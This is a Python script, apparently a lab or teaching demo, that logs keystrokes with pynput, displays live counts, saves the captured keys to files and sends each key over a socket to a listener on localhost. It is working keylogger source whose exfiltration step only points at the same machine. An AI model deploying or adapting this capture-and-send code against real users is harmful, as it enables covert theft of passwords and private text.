import os
from datetime import datetime
from pynput import keyboard
from colorama import init, Fore, Style
import socket
import threading
import csv

# Initialize colorama
init(autoreset=True)

# --- Networking Simulation ---
HOST = '127.0.0.1'  # Localhost only
PORT = 65432        # Arbitrary port

def start_server():
    """Simulate remote listener server on the same VM."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(Fore.YELLOW + f"Server: Connected by {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print(Fore.CYAN + f"Server received: {data.decode('utf-8')}")
                
def send_keystroke(key):
    """Send keystroke to simulated server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            s.sendall(key.encode('utf-8'))
        except ConnectionRefusedError:
            print(Fore.RED + "Server not running. Keystroke not sent.")

# --- Core Functions ---
def create_output_folder():
    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(folder_name, exist_ok=True)
    return folder_name

def display_dashboard(stats):
    total = stats.get('total', 1)
    print("\033c", end="")  # clear terminal
    print(Fore.YELLOW + Style.BRIGHT + "=== Live Keystroke Dashboard ===\n")
    print(Fore.CYAN + f"Total Keystrokes: {stats['total']}")
    print(Fore.GREEN + f"Letters: {stats['letters']} | {'='*stats['letters']}")
    print(Fore.BLUE + f"Numbers: {stats['numbers']} | {'='*stats['numbers']}")
    print(Fore.MAGENTA + f"Special Keys: {stats['special_keys']} | {'='*stats['special_keys']}")
    print(Fore.RED + f"Other Chars: {stats['other_chars']} | {'='*stats['other_chars']}")

def save_keystrokes(folder_name, keystrokes, stats):
    # Save keystrokes
    with open(os.path.join(folder_name, "keystrokes.txt"), "w") as f:
        for i, k in enumerate(keystrokes, 1):
            f.write(f"{i}: {k}\n")
    # Save stats
    with open(os.path.join(folder_name, "stats.txt"), "w") as f:
        for k, v in stats.items():
            f.write(f"{k}: {v}\n")
    # Save report
    report_txt = os.path.join(folder_name, "report.txt")
    with open(report_txt, "w") as f:
        f.write(f"Total: {stats['total']}\n")
        for key_type in ['letters','numbers','special_keys','other_chars']:
            pct = (stats[key_type]/stats['total']*100 if stats['total'] else 0)
            f.write(f"{key_type}: {stats[key_type]} ({pct:.2f}%)\n")
    print(Fore.GREEN + f"\nKeystrokes and report saved in {folder_name}")

def on_press(key, keystrokes, stats, max_keys):
    try:
        char = key.char
        keystrokes.append(char)
        if char.isalpha():
            stats['letters'] += 1
        elif char.isdigit():
            stats['numbers'] += 1
        else:
            stats['other_chars'] += 1
    except AttributeError:
        keystrokes.append(str(key))
        stats['special_keys'] += 1

    stats['total'] += 1
    display_dashboard(stats)
    send_keystroke(str(keystrokes[-1]))  # Safe local simulation

    if stats['total'] >= max_keys:
        return False

def capture_keystrokes_dashboard(max_keys=30):
    keystrokes = []
    stats = {'letters':0,'numbers':0,'special_keys':0,'other_chars':0,'total':0}
    print(Fore.YELLOW + f"Start typing {max_keys} keys (Dashboard live):")
    with keyboard.Listener(
        on_press=lambda key: on_press(key, keystrokes, stats, max_keys)
    ) as listener:
        listener.join()
    return keystrokes, stats

# --- Main ---
if __name__ == "__main__":
    # Start simulated server in another thread
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()

    folder = create_output_folder()
    keys, stats = capture_keystrokes_dashboard(max_keys=20)
    save_keystrokes(folder, keys, stats)
